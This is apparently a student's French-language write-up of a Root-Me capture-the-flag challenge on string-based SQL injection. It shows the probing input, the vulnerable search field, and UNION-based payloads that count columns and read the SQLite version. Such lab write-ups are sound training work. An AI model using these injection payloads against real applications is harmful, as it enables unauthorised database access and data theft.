# RootMe

# SQL injection - String

URL : http://challenge01.root-me.org/web-serveur/ch19

Etudiant | Date | Sujet
:---|:---|:---
Hamza Terir | 23/11/2022 | SQLi


### Erreur SQL
```
admin'
```

![Pasted image 20221123135349](https://user-images.githubusercontent.com/122984033/213180205-c2af302a-74df-4617-a038-892e857cdc4a.png)

### Point d'injection

Le point d'injection est dans la barre de recherche qui est accessible à cette url :

http://challenge01.root-me.org/web-serveur/ch19/


![Pasted image 20230118141543](https://user-images.githubusercontent.com/122984033/213181856-63ba1da1-f3f7-4250-8f57-11e4e1fb3a1f.png)

## Exploitation

### Requête True
```sql
' OR 1=1
```

### Nombre de colonnes (2)
```sql
' UNION SELECT null,null -- 
```

#### Informations

Database version : SQLite3

### Version
```sql
' UNION SELECT null,sqlite_version() -- 
```

![Pasted image 20221123142951](https://user-images.githubusercontent.com/122984033/213182251-f8688658-98f8-41ff-adef-d2c3e06f2f4e.png)


